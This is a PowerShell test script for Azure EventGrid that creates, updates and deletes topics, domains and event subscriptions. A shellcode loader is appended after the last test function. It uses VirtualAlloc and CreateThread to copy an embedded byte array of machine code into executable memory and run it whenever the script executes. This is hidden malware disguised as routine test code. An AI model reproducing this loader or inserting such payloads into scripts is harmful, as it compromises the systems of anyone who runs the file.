    $storageContainerName = Get-StorageBlobName

    New-StorageBlob $ResourceGroupName $storageAccountName $storageContainerName $location
    $deadletterResourceId = Get-DeadletterResourceId $resourceGroupName $storageAccountName $storageContainerName

    try
    {
        
        Write-Host "Creating a new EventGrid Topic: $topicName in resource group $resourceGroupName"
        $result = New-AzEventGridTopic -ResourceGroupName $resourceGroupName -Name $topicName -Location $location
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName to topic $topicName in resource group $resourceGroupName"
        $result = Get-AzEventGridTopic -ResourceGroupName $resourceGroupName -Name $topicName | New-AzEventGridSubscription -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName -DeadLetterEndpoint $deadletterResourceId
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Getting the created event subscription $eventSubscriptionName"
        $result = Get-AzEventGridSubscription -ResourceGroupName $resourceGroupName -TopicName $topicName -EventSubscriptionName $eventSubscriptionName -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName}

        
        Write-Host "Creating a new EventGrid domain: $domainName in resource group $resourceGroupName"
        $result = New-AzEventGridDomain -ResourceGroupName $resourceGroupName -Name $domainName -Location $location
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName to domain $domainName in resource group $resourceGroupName"
        $result = Get-AzEventGridDomain -ResourceGroupName $resourceGroupName -Name $domainName | New-AzEventGridSubscription -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName -DeadLetterEndpoint $deadletterResourceId
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Getting the created event subscription $eventSubscriptionName"
        $result = Get-AzEventGridSubscription -ResourceGroupName $resourceGroupName -DomainName $domainName -EventSubscriptionName $eventSubscriptionName -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName}

        
        Write-Debug "Creating a new EventSubscription $eventSubscriptionName to domain topic $domainTopicName under domain $domainName in resource group $resourceGroupName"
        New-AzEventGridSubscription -ResourceGroupName $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName -DeadLetterEndpoint $deadletterResourceId
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Getting the created event subscription $eventSubscriptionName"
        $result = Get-AzEventGridSubscription -ResourceGroupName $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName -EventSubscriptionName $eventSubscriptionName -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName}

        Write-Debug "Deleting event subscription $eventSubscriptionName for custom topic $topicName"
        Get-AzEventGridTopic -ResourceGroupName $resourceGroupName -Name $topicName | Remove-AzEventGridSubscription -EventSubscriptionName $eventSubscriptionName

        Write-Debug "Deleting event subscription $eventSubscriptionName for domain $domainName"
        Get-AzEventGridDomain -ResourceGroupName $resourceGroupName -DomainName $domainName | Remove-AzEventGridSubscription -EventSubscriptionName $eventSubscriptionName

        Write-Debug "Deleting event subscription $eventSubscriptionName for domain topic $domainTopicName under domain $domainName"
        Get-AzEventGridDomainTopic -ResourceGroupName $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName | Remove-AzEventGridSubscription -EventSubscriptionName $eventSubscriptionName

        Write-Debug "Deleting topic $topicName"
        Remove-AzEventGridTopic -Name $topicName -ResourceGroupName $resourceGroupName

        Write-Debug "Deleting domain $domainName"
        Remove-AzEventGridDomain -DomainName $domainName -ResourceGroupName $resourceGroupName
    }
    finally
    {
        Remove-StorageContainerResources $ResourceGroupName $storageAccountName $storageContainerName
        Remove-ResourceGroup $resourceGroupName
    }
}


function EventSubscriptionTests_Domains {
    
    $subscriptionId = Get-SubscriptionId
    $location = Get-LocationForEventGrid
    $resourceGroupName = Get-ResourceGroupName
    $domainName = Get-DomainName

    $eventSubscriptionName = Get-EventSubscriptionName
    $eventSubscriptionName2 = Get-EventSubscriptionName
    $eventSubscriptionName3 = Get-EventSubscriptionName
    $eventSubscriptionName4 = Get-EventSubscriptionName

    New-ResourceGroup $resourceGroupName $location

    try
    {
        Write-Debug "Creating a new EventGrid domain: $domainName in resource group $resourceGroupName"
        $result = New-AzEventGridDomain -ResourceGroup $resourceGroupName -Name $domainName -Location $location
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        $eventSubscriptionEndpoint = Get-EventSubscriptionWebhookEndpoint
        $eventSubscriptionBaseEndpoint = Get-EventSubscriptionWebhookBaseEndpoint

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName to domain $domainName in resource group $resourceGroupName using DomainName option"
        $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName2 to domain $domainName in resource group $resourceGroupName using resourceId option"
        $result = New-AzEventGridSubscription -resourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventGrid/domains/$domainName" -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName2
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName3 to domain $domainName in resource group $resourceGroupName using domain object"

        $result = Get-AzEventGridDomain -resourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventGrid/domains/$domainName" | New-AzEventGridSubscription -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName3
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        try
        {
            Write-Debug "Creating a new EventSubscription $eventSubscriptionName4 to domain $domainName in resource group $resourceGroupName"
            $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName4 -EventTtl 21300
            Assert-True {$false} "New-AzEventGridSubscription succeeded while it is expected to fail as EventTtl range is invalid"
        }
        catch
        {
            Assert-True {$true}
        }

        try
        {
            Write-Debug "Creating a new EventSubscription $eventSubscriptionName4 to domain $domainName in resource group $resourceGroupName with invalid MaxDeliveryAttempt"
            $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName4 -MaxDeliveryAttempt 300
            Assert-True {$false} "New-AzEventGridSubscription succeeded while it is expected to fail as MaxDeliveryAttempt range is invalid"
        }
        catch
        {
            Assert-True {$true}
        }

        try
        {
            $invalidExpirationDate = (Get-Date).adddays(-2)
            Write-Debug "Creating a new EventSubscription $eventSubscriptionName4 to domain $domainName in resource group $resourceGroupName with invalid expiration date"
            $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName4 -ExpirationDate $invalidExpirationDate
            Assert-True {$false} "New-AzEventGridSubscription succeeded while it is expected to fail as ExpirationDate is invalid"
        }
        catch
        {
            Assert-True {$true}
        }

        $validExpirationDate = (Get-Date).adddays(2)
        $validExpirationDateUtc = $validExpirationDate.ToUniversalTime()

        try
        {
            $InvalidAdvFilter1=@{operator="NumberIn"; key="Data.Key1"; Values=@(1,2); ExtraKey="ExtraValud"}
            Write-Debug "Creating a new EventSubscription $eventSubscriptionName4 to domain $domainName in resource group $resourceGroupName with invalid Advanced Filter"
            $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName4 -AdvancedFilter @($InvalidAdvFilter1)
            Assert-True {$false} "New-AzEventGridSubscription succeeded while it is expected to fail as AdvancedFilter has incorrect number of key-values entities"
        }
        catch
        {
            Assert-True {$true}
        }

        try
        {
            $InvalidAdvFilter2=@{operator="InvalidOperator"; key="Subject"; Values=@("vv","xx")}
            Write-Debug "Creating a new EventSubscription $eventSubscriptionName4 to domain $domainName in resource group $resourceGroupName with invalid Advanced Filter"
            $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName4 -AdvancedFilter @($InvalidAdvFilter2)
            Assert-True {$false} "New-AzEventGridSubscription succeeded while it is expected to fail as AdvancedFilter has incorrect operator value"
        }
        catch
        {
            Assert-True {$true}
        }

        try
        {
            $InvalidAdvFilter1=@{operator=$null; key="Data.Key1"; Values=@(1,2)}
            Write-Debug "Creating a new EventSubscription $eventSubscriptionName4 to domain $domainName in resource group $resourceGroupName with invalid Advanced Filter"
            $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName4 -AdvancedFilter @($InvalidAdvFilter1)
            Assert-True {$false} "New-AzEventGridSubscription succeeded while it is expected to fail as AdvancedFilter has null operator"
        }
        catch
        {
            Assert-True {$true}
        }

        try
        {
            $InvalidAdvFilter1=@{operator=""; key="Data.Key1"; Values=@(1,2)}
            Write-Debug "Creating a new EventSubscription $eventSubscriptionName4 to domain $domainName in resource group $resourceGroupName with invalid Advanced Filter"
            $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName4 -AdvancedFilter @($InvalidAdvFilter1)
            Assert-True {$false} "New-AzEventGridSubscription succeeded while it is expected to fail as AdvancedFilter has empty operator value"
        }
        catch
        {
            Assert-True {$true}
        }

        try
        {
            $InvalidAdvFilter1=@{operator="NumberIn"; key="Data.Key1"; Values=$null}
            Write-Debug "Creating a new EventSubscription $eventSubscriptionName4 to domain $domainName in resource group $resourceGroupName with invalid Advanced Filter"
            $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName4 -AdvancedFilter @($InvalidAdvFilter1)
            Assert-True {$false} "New-AzEventGridSubscription succeeded while it is expected to fail as AdvancedFilter has null values"
        }
        catch
        {
            Assert-True {$true}
        }

        
        $AdvFilter1=@{operator="NumberIn"; key="Data.Key1"; Values=@(1,2)}
        $AdvFilter2=@{operator="StringBeginsWith"; key="Subject"; Values=@("vv","xx")}
        $AdvFilter3=@{operator="NumberLessThan"; key="Data.Key12"; Value=5.12}
        $AdvFilter4=@{operator="BoolEquals"; key="Data.Key6"; Value=$false}
        $AdvFilter5=@{operator="NumberLessThan"; key="Data.Key12"; Value=205.12}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName4 to domain $domainName in resource group $resourceGroupName with valid EventTtl/MaxDeliveryAttempt/ExpirationDate/AdvFilter parameters."
        $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName4 -EventTtl 50 -MaxDeliveryAttempt 20 -ExpirationDate $validExpirationDate -SubjectBeginsWith "Text1" -SubjectEndsWith "text2" -AdvancedFilter @($AdvFilter1, $AdvFilter2, $AdvFilter3, $AdvFilter4)
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Getting the created event subscription $eventSubscriptionName4 created under domain $domainName using DomainName option"
        $result = Get-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -EventSubscriptionName $eventSubscriptionName4 -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName4}
        Assert-True {$result.EventTtl -eq 50}
        Assert-True {$result.MaxDeliveryAttempt -eq 20}

        
        
        Assert-True {$result.Filter.SubjectBeginsWith -eq "Text1"}
        Assert-True {$result.Filter.SubjectEndsWith -eq "Text2"}
        Assert-True {$result.Filter.AdvancedFilters -ne $null}

        Write-Debug "Updating event subscription $eventSubscriptionName4 created under domain $domainName using DomainName option"
        $validExpirationDate = (Get-Date).adddays(10)
        $validExpirationDateUtc = $validExpirationDate.ToUniversalTime()

        $result = Update-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -EventSubscriptionName $eventSubscriptionName4 -EventTtl 20 -MaxDeliveryAttempt 12 -ExpirationDate $validExpirationDate -SubjectBeginsWith "UpdatedText1" -SubjectEndsWith "Updatedtext2"
        Assert-True {$result.ProvisioningState -eq "Succeeded"}
        Assert-True {$result.Filter.SubjectBeginsWith -eq "UpdatedText1"}
        Assert-True {$result.Filter.SubjectEndsWith -eq "UpdatedText2"}
        Assert-True {$result.EventTtl -eq 20}
        Assert-True {$result.MaxDeliveryAttempt -eq 12}
        
        

        Write-Debug "Updating event subscription $eventSubscriptionName4 created under domain $domainName using EventSubscription Object"
        Get-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -EventSubscriptionName $eventSubscriptionName4 | Update-AzEventGridSubscription -AdvancedFilter @($AdvFilter5)
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        $result = Get-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -EventSubscriptionName $eventSubscriptionName4 -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName4}
        Assert-True {$result.Filter.AdvancedFilters -ne $null}

        Write-Debug "Updating event subscription $eventSubscriptionName4 created under domain $domainName using resourceId option"
        $AdvFilter6=@{operator="NumberGreaterThan"; key="Data.Key122"; Value=12.10}
        Update-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventGrid/domains/$domainName" -EventSubscriptionName $eventSubscriptionName4 -AdvancedFilter @($AdvFilter1, $AdvFilter6)
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Listing all the event subscriptions created for domain $domainName in the resourceGroup $resourceGroup using DomainName option"
        $allCreatedSubscriptions = Get-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -IncludeFullEndpointUrl
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -eq 4 } "

        Write-Debug "Listing all the event subscriptions created for domain $domainName in the resourceGroup $resourceGroup using domain object"
        $allCreatedSubscriptions = Get-AzEventGridDomain -ResourceGroup $resourceGroupName -DomainName $domainName | Get-AzEventGridSubscription
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -eq 4 } "Listing all event subscriptions using Input Object: Event Subscriptions created earlier are not found in the list"

        Write-Debug "Deleting event subscription $eventSubscriptionName and $eventSubscriptionName2 under domain $domainName using DomainName option"
        Remove-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -EventSubscriptionName $eventSubscriptionName
        Remove-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -EventSubscriptionName $eventSubscriptionName2

        Write-Debug "Get all event subscriptions under domain $domainName using Domain object"
        $result = Get-AzEventGridDomain -ResourceGroup $resourceGroupName -DomainName $domainName | Get-AzEventGridSubscription
        Assert-True {$result.PsEventSubscriptionsList.Count -eq 2 } "unexpected number of event subscriptions after partial delete of event subscription"

        Write-Debug "Deleting event subscriptions: $eventSubscriptionName3 under domain $domain using domain object"
        Get-AzEventGridDomain -ResourceGroup $resourceGroupName -DomainName $domainName | Remove-AzEventGridSubscription -EventSubscriptionName $eventSubscriptionName3
        

        Write-Debug "Deleting event subscriptions: $eventSubscriptionName4 under domain $domain using resourceId option"
        Remove-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventGrid/domains/$domainName" -EventSubscriptionName $eventSubscriptionName4

        Write-Debug "Verify that all event subscriptions have been deleted correctly"
        $returnedES = Get-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName
        Assert-True {$returnedES.PsEventSubscriptionsList.Count -eq 0 } "unexpected number of event subscriptions after full delete of event subscription"

        Write-Debug "Deleting domain $domainName"
        Remove-AzEventGridDomain -ResourceGroup $resourceGroupName -Name $domainName
    }
    finally
    {
        Remove-ResourceGroup $resourceGroupName
    }
}


function EventSubscriptionTests_DomainTopics {
    
    $subscriptionId = Get-SubscriptionId
    $location = Get-LocationForEventGrid
    $resourceGroupName = Get-ResourceGroupName
    $domainName = Get-DomainName
    $domainTopicName = Get-DomainTopicName

    $eventSubscriptionName = Get-EventSubscriptionName
    $eventSubscriptionName2 = Get-EventSubscriptionName
    $eventSubscriptionName3 = Get-EventSubscriptionName
    $eventSubscriptionName4 = Get-EventSubscriptionName

    New-ResourceGroup $resourceGroupName $location

    try
    {
        Write-Debug "Creating a new EventGrid domain: $domainName in resource group $resourceGroupName"
        $result = New-AzEventGridDomain -ResourceGroup $resourceGroupName -Name $domainName -Location $location
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        $eventSubscriptionEndpoint = Get-EventSubscriptionWebhookEndpoint
        $eventSubscriptionBaseEndpoint = Get-EventSubscriptionWebhookBaseEndpoint

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName to domain topic $domainTopicName under domain $domainName in resource group $resourceGroupName using DomainName option"
        $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName2 to domain topic $domainTopicName under domain $domainName in resource group $resourceGroupName using resourceId option"
        $result = New-AzEventGridSubscription -resourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventGrid/domains/$domainName/topics/$domainTopicName" -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName2
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName3 to domain topic $domainTopicName under domain $domainName in resource group $resourceGroupName using domain topic object"
        $result = Get-AzEventGridDomainTopic -resourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventGrid/domains/$domainName/topics/$domainTopicName" | New-AzEventGridSubscription -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName3
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        $validExpirationDate = (Get-Date).adddays(2)
        $validExpirationDateUtc = $validExpirationDate.ToUniversalTime()

        
        $AdvFilter1=@{operator="NumberIn"; key="Data.Key1"; Values=@(1,2)}
        $AdvFilter2=@{operator="StringBeginsWith"; key="Subject"; Values=@("vv","xx")}
        $AdvFilter3=@{operator="NumberLessThan"; key="Data.Key12"; Value=5.12}
        $AdvFilter4=@{operator="BoolEquals"; key="Data.Key6"; Value=$false}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName4 to domain topic $domainTopicName under domain $domainName in resource group $resourceGroupName with valid EventTtl/MaxDeliveryAttempt/ExpirationDate/AdvFilter parameters."
        $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName4 -EventTtl 50 -MaxDeliveryAttempt 20 -ExpirationDate $validExpirationDate -SubjectBeginsWith "Text1" -SubjectEndsWith "text2" -AdvancedFilter @($AdvFilter1, $AdvFilter2, $AdvFilter3, $AdvFilter4)
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Getting the created event subscription $eventSubscriptionName4 created under domain topic $domainTopicName domain $domainName using DomainName option"
        $result = Get-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName -EventSubscriptionName $eventSubscriptionName4 -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName4}
        Assert-True {$result.EventTtl -eq 50}
        Assert-True {$result.MaxDeliveryAttempt -eq 20}

        
        
        Assert-True {$result.Filter.SubjectBeginsWith -eq "Text1"}
        Assert-True {$result.Filter.SubjectEndsWith -eq "Text2"}
        Assert-True {$result.Filter.AdvancedFilters -ne $null}

        Write-Debug "Updating event subscription $eventSubscriptionName4 created under domain topic $domainTopicName of domain $domainName using DomainName option"
        $validExpirationDate = (Get-Date).adddays(10)
        $validExpirationDateUtc = $validExpirationDate.ToUniversalTime()

        $result = Update-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName -EventSubscriptionName $eventSubscriptionName4 -EventTtl 20 -MaxDeliveryAttempt 12 -ExpirationDate $validExpirationDate -SubjectBeginsWith "UpdatedText1" -SubjectEndsWith "Updatedtext2"
        Assert-True {$result.ProvisioningState -eq "Succeeded"}
        Assert-True {$result.Filter.SubjectBeginsWith -eq "UpdatedText1"}
        Assert-True {$result.Filter.SubjectEndsWith -eq "UpdatedText2"}
        Assert-True {$result.EventTtl -eq 20}
        Assert-True {$result.MaxDeliveryAttempt -eq 12}

        
        

        Write-Debug "Updating event subscription $eventSubscriptionName4 created under domain topic $domainTopicName of domain $domainName using EventSubscription Object"
        $AdvFilter5=@{operator="NumberLessThan"; key="Data.Key12"; Value=205.12}
        $result = Get-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName -EventSubscriptionName $eventSubscriptionName4 | Update-AzEventGridSubscription -AdvancedFilter @($AdvFilter5)
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        $result = Get-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName -EventSubscriptionName $eventSubscriptionName4 -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName4}
        Assert-True {$result.Filter.AdvancedFilters -ne $null}

        Write-Debug "Updating event subscription $eventSubscriptionName4 created under domain topic $domainTopicName for domain $domainName using resourceId option"
        $AdvFilter6=@{operator="NumberGreaterThan"; key="Data.Key122"; Value=12.10}
        Update-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventGrid/domains/$domainName/topics/$domainTopicName" -EventSubscriptionName $eventSubscriptionName4 -AdvancedFilter @($AdvFilter1, $AdvFilter6)
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Listing all the event subscriptions created for domain topic $domainTopicName under domain $domainName in the resourceGroup $resourceGroup using DomainName option"
        $allCreatedSubscriptions = Get-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName -IncludeFullEndpointUrl
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -eq 4 } "

        Write-Debug "Listing all the event subscriptions created for domain $domainName in the resourceGroup $resourceGroup using domain topic object"
        $allCreatedSubscriptions = Get-AzEventGridDomainTopic -ResourceGroup $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName | Get-AzEventGridSubscription
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -eq 4 } "Listing all event subscriptions using Input Object: Event Subscriptions created earlier are not found in the list"

        Write-Debug "Deleting event subscription $eventSubscriptionName and $eventSubscriptionName2 under domain topic $domainTopicName of domain $domainName using DomainName option"
        Remove-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName -EventSubscriptionName $eventSubscriptionName
        Remove-AzEventGridSubscription -ResourceGroup $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName -EventSubscriptionName $eventSubscriptionName2

        Write-Debug "Get all event subscriptions under domain $domainName using Domain topic object"
        $result = Get-AzEventGridDomainTopic -ResourceGroup $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName | Get-AzEventGridSubscription
        Assert-True {$result.PsEventSubscriptionsList.Count -eq 2 } "unexpected number of event subscriptions after partial delete of event subscription"

        Write-Debug "Deleting event subscriptions: $eventSubscriptionName3 under domain $domain using domain topic object"
        Get-AzEventGridDomainTopic -ResourceGroup $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName | Remove-AzEventGridSubscription -EventSubscriptionName $eventSubscriptionName3
        

        Write-Debug "Deleting event subscriptions: $eventSubscriptionName4 under domain topic $domainTopicName of domain $domain using resourceId option"
        Remove-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventGrid/domains/$domainName/topics/$domainTopicName" -EventSubscriptionName $eventSubscriptionName4

        try
        {
            Write-Debug "Verify that domain topic $domainTopicName of domain $domainName is auto-removed as all event subscriptions are deleted"
            Get-AzEventGridDomainTopic -ResourceGroup $resourceGroupName -DomainName $domainName -DomainTopicName $domainTopicName
            Assert-True {$false} "Get-AzEventGridDomainTopic succeeded while it is expected to fail as domain topic should be auto-deleted."
        }
        catch
        {
            Assert-True {$true}
        }

        Write-Debug "Deleting domain $domainName"
        Remove-AzEventGridDomain -ResourceGroup $resourceGroupName -Name $domainName
    }
    finally
    {
        Remove-ResourceGroup $resourceGroupName
    }
}

$z1a = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $z1a -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xbb,0x49,0xff,0x77,0xbb,0xb1,0x47,0x83,0xe8,0xfc,0x31,0x58,0x14,0x03,0x58,0x5d,0x1d,0x82,0x47,0xb5,0x63,0x6d,0xb8,0x45,0x04,0xe7,0x5d,0x74,0x04,0x93,0x16,0x26,0xb4,0xd7,0x7b,0xca,0x3f,0xb5,0x6f,0x59,0x4d,0x12,0x9f,0xea,0xf8,0x44,0xae,0xeb,0x51,0xb4,0xb1,0x6f,0xa8,0xe9,0x11,0x4e,0x63,0xfc,0x50,0x97,0x9e,0x0d,0x00,0x40,0xd4,0xa0,0xb5,0xe5,0xa0,0x78,0x3d,0xb5,0x25,0xf9,0xa2,0x0d,0x47,0x28,0x75,0x06,0x1e,0xea,0x77,0xcb,0x2a,0xa3,0x6f,0x08,0x16,0x7d,0x1b,0xfa,0xec,0x7c,0xcd,0x33,0x0c,0xd2,0x30,0xfc,0xff,0x2a,0x74,0x3a,0xe0,0x58,0x8c,0x39,0x9d,0x5a,0x4b,0x40,0x79,0xee,0x48,0xe2,0x0a,0x48,0xb5,0x13,0xde,0x0f,0x3e,0x1f,0xab,0x44,0x18,0x03,0x2a,0x88,0x12,0x3f,0xa7,0x2f,0xf5,0xb6,0xf3,0x0b,0xd1,0x93,0xa0,0x32,0x40,0x79,0x06,0x4a,0x92,0x22,0xf7,0xee,0xd8,0xce,0xec,0x82,0x82,0x86,0xc1,0xae,0x3c,0x56,0x4e,0xb8,0x4f,0x64,0xd1,0x12,0xd8,0xc4,0x9a,0xbc,0x1f,0x2b,0xb1,0x79,0x8f,0xd2,0x3a,0x7a,0x99,0x10,0x6e,0x2a,0xb1,0xb1,0x0f,0xa1,0x41,0x3e,0xda,0x5c,0x47,0xa8,0xef,0x1a,0x45,0x67,0x98,0x58,0x4a,0x66,0x04,0xd4,0xac,0xd8,0xe4,0xb6,0x60,0x98,0x54,0x77,0xd1,0x70,0xbf,0x78,0x0e,0x60,0xc0,0x52,0x27,0x0a,0x2f,0x0b,0x1f,0xa2,0xd6,0x16,0xeb,0x53,0x16,0x8d,0x91,0x53,0x9c,0x22,0x65,0x1d,0x55,0x4e,0x75,0xc9,0x95,0x05,0x27,0x5f,0xa9,0xb3,0x42,0x5f,0x3f,0x38,0xc5,0x08,0xd7,0x42,0x30,0x7e,0x78,0xbc,0x17,0xf5,0xb1,0x28,0xd8,0x61,0xbe,0xbc,0xd8,0x71,0xe8,0xd6,0xd8,0x19,0x4c,0x83,0x8a,0x3c,0x93,0x1e,0xbf,0xed,0x06,0xa1,0x96,0x42,0x80,0xc9,0x14,0xbd,0xe6,0x55,0xe6,0xe8,0xf6,0xaa,0x31,0xd4,0x8c,0xc2,0x81;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$lOJ=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($lOJ.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$lOJ,0,0,0);for (;;){Start-sleep 60};

